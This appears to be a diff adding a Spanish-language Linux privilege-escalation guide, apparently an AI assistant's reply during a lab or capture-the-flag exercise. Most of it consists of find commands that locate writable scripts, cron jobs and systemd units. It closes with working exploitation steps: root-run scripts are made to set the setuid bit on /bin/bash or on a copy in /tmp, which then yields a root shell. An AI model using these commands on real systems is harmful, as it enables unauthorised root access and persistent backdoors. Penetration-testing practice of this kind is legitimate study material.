@@ -1,0 +1,75 @@
+🔍 Búsquedas específicas por extensión
+Opción 1: Buscar archivos específicos escribibles
+bashfind / -writable -type f \( -name "*.sh" -o -name "*.py" -o -name "*.php" \) 2>/dev/null
+Opción 2: Buscar más extensiones de scripts
+bashfind / -writable -type f \( -name "*.sh" -o -name "*.py" -o -name "*.php" -o -name "*.pl" -o -name "*.rb" -o -name "*.bash" \) 2>/dev/null
+Opción 3: Excluir directorios comunes (más rápido)
+bashfind / -writable -type f \( -name "*.sh" -o -name "*.py" -o -name "*.php" \) \
+  -not -path "/proc/*" \
+  -not -path "/sys/*" \
+  -not -path "/home/samara/*" \
+  2>/dev/null
+🎯 Búsquedas más específicas por caso de uso
+Scripts ejecutables escribibles (MUY IMPORTANTE)
+bashfind / -writable -executable -type f 2>/dev/null | grep -E '\.(sh|py|php|pl)$'
+Scripts en directorios de sistema
+bashfind /usr /etc /opt /var -writable -type f \( -name "*.sh" -o -name "*.py" -o -name "*.php" \) 2>/dev/null
+Scripts ejecutados por root (cron, systemd)
+bash# Cron jobs
+find /etc/cron* -writable -type f 2>/dev/null
+find /var/spool/cron -writable -type f 2>/dev/null
+
+# Scripts de systemd
+find /etc/systemd -writable -type f -name "*.service" 2>/dev/null
+Scripts en PATH
+bashfor dir in $(echo $PATH | tr ':' '\n'); do
+  find "$dir" -writable -type f 2>/dev/null
+done
+💡 Búsqueda inteligente con análisis
+bash# Encuentra y muestra permisos detallados
+find / -writable -type f \( -name "*.sh" -o -name "*.py" -o -name "*.php" \) \
+  -exec ls -lah {} \; 2>/dev/null
+🚀 Script completo de búsqueda
+bash#!/bin/bash
+echo "[+] Buscando scripts escribibles..."
+
+echo -e "\n[*] Scripts .sh escribibles:"
+find / -writable -name "*.sh" -type f 2>/dev/null
+
+echo -e "\n[*] Scripts .py escribibles:"
+find / -writable -name "*.py" -type f 2>/dev/null
+
+echo -e "\n[*] Scripts .php escribibles:"
+find / -writable -name "*.php" -type f 2>/dev/null
+
+echo -e "\n[*] Scripts ejecutables escribibles:"
+find / -writable -executable -type f 2>/dev/null | grep -E '\.(sh|py|php|pl|rb)$'
+
+echo -e "\n[*] Archivos en /etc escribibles:"
+find /etc -writable -type f 2>/dev/null
+
+echo -e "\n[*] Cron jobs escribibles:"
+find /etc/cron* /var/spool/cron -writable 2>/dev/null
+⚡ Comando rápido y efectivo
+bashfind / -writable -type f 2>/dev/null | grep -E '\.(sh|py|php|pl|rb|bash)$' | grep -v "^/home/samara" | grep -v "^/proc" | grep -v "^/sys"
+🎯 ¿Qué buscar específicamente?
+Una vez encuentres archivos, verifica:
+bash# Ver permisos y dueño
+ls -la /ruta/al/script.sh
+
+# Ver si es ejecutado por root o cron
+grep -r "script.sh" /etc/cron* 2>/dev/null
+systemctl list-units | grep script
+
+# Ver el contenido
+cat /ruta/al/script.sh
+💣 Explotación típica
+Si encuentras un script ejecutado por root que puedes editar:
+bash# Agregar al final del script
+echo 'chmod +s /bin/bash' >> /ruta/script_root.sh
+# O
+echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /ruta/script_root.sh
+
+# Esperar a que se ejecute, luego:
+/tmp/rootbash -p
+¿Quieres que pruebe alguna búsqueda específica? 🔍
